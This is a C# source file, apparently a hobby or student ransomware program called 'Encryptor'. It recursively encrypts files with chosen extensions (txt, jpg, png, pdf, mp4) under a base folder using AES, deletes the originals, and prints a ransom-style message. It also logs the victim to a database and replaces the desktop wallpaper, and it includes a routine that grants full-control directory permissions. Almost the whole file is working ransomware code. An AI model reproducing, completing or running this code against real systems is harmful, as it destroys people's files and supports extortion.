using System;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Security.AccessControl;
using Decryptor;

namespace Encryptor
{
	internal class EncryptorClass
	{
		static List<string> targetExtensions = new List<string>(){".txt", ".jpg", ".png", ".pdf", ".mp4" };
		//String key;
		static List<string> foldersBlacklist = new List<string>() { "Windows", "Program Files", "Program Files (x86)", ".pdf", ".mp4" };

		public static void Main(string[] args)
		{

			AesCryptoServiceProvider aes = createCipher();
			
			// Decide on base directory
			string baseDirectory = "C:\\test";

			// Encrypt the victims files 
			itterate(baseDirectory, aes);

			// getting paied
			System.Console.WriteLine("Your feils have been encryptrd!");
			DB.addVictimToDB(aes);
			
			// Change wallpaper
			Uri wallpaper = new Uri("https://vignette.wikia.nocookie.net/dragonballfanon/images/7/70/Random.png/revision/latest?cb=20161221030547");
			Wallpaper.Set(wallpaper,Wallpaper.Style.Fill);
		}
		
		/// <summary>
		/// This function recives a directpry and a aes key and encrypts
		/// recursivly all of the files in the directory
		/// </summary>
		private static void itterate(string currentDirectory, AesCryptoServiceProvider aes)
		{
			var allfiles = Directory.GetFiles(currentDirectory);
			var currentFiles = allfiles.Where(fn => correctTargetExtension(Path.GetExtension(fn)));

			foreach (string filePath in currentFiles)
			{
				encryptFile(filePath, aes);
			}
			var currentDirectories = Directory.GetDirectories(currentDirectory);
			foreach (string directory in currentDirectories)
			{
				itterate(directory, aes);
			}

		}

		/// <summary>
		/// recives a file and a key and creates another file that has the same content only encrypted and then
		/// deletes the original file
		/// </summary>
		/// <param name="filePath"></param>
		/// <param name="aes"></param>
		private static void encryptFile(string filePath, AesCryptoServiceProvider aes)
		{
			System.Threading.Thread.Sleep(200);
			var buffer = new byte[65536];
			File.SetAttributes(filePath, FileAttributes.Normal);

			using (var streamIn = new FileStream(filePath, FileMode.Open,FileAccess.Read))
			using (var streamOut = new FileStream(filePath + ".enc", FileMode.Create))
			using (var encrypt = new CryptoStream(streamOut, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				int bytesRead;
				do
				{
					bytesRead = streamIn.Read(buffer, 0, buffer.Length);
					if (bytesRead != 0)
						encrypt.Write(buffer, 0, bytesRead);
				}
				while (bytesRead != 0);
			}
			File.Delete(filePath);

		}


		public static void changeDirectoryPermissions(string path){
			System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(path);
			FileSystemAccessRule fsar = new FileSystemAccessRule(path, FileSystemRights.FullControl, AccessControlType.Allow);
			DirectorySecurity ds = null;
			ds = di.GetAccessControl();
			ds.AddAccessRule(fsar);
			di.SetAccessControl(ds); // nothing happens until you do this
		}

		private static bool correctTargetExtension(string fileExtension){
			return targetExtensions.Exists(e => e == fileExtension);
		}

		private static AesCryptoServiceProvider createCipher(){
			// Create the key
			var aes = new AesCryptoServiceProvider();
			aes.GenerateKey();
			//aes.Key = Convert.FromBase64String(@"OoIsAwwF23cICQoLDA0ODe==");
			//Console.WriteLine(System.Text.Encoding.Unicode.GetString(aes.Key));
			Console.WriteLine(BitConverter.ToString(aes.Key));

			using (var streamOut = new FileStream("c:/test/keyFile.key", FileMode.Create)){
				BinaryWriter bin = new BinaryWriter(streamOut,new System.Text.UTF8Encoding());
				bin.Write(aes.Key, 0, 32);

				aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
				bin.Close();
			}
			return aes;
		}

		private AesCryptoServiceProvider getDecryptionCipher(){
			var aes = new AesCryptoServiceProvider();

			using (var streamIn = new FileStream("c:/test/keyFile.key", FileMode.Open, FileAccess.Read)){
				BinaryReader bin = new BinaryReader(streamIn,new System.Text.UTF8Encoding());
				aes.Key = bin.ReadBytes(32);
				Console.WriteLine(BitConverter.ToString(aes.Key));
				aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };  
				bin.Close();
			}

			return aes;

		}
	}
	
}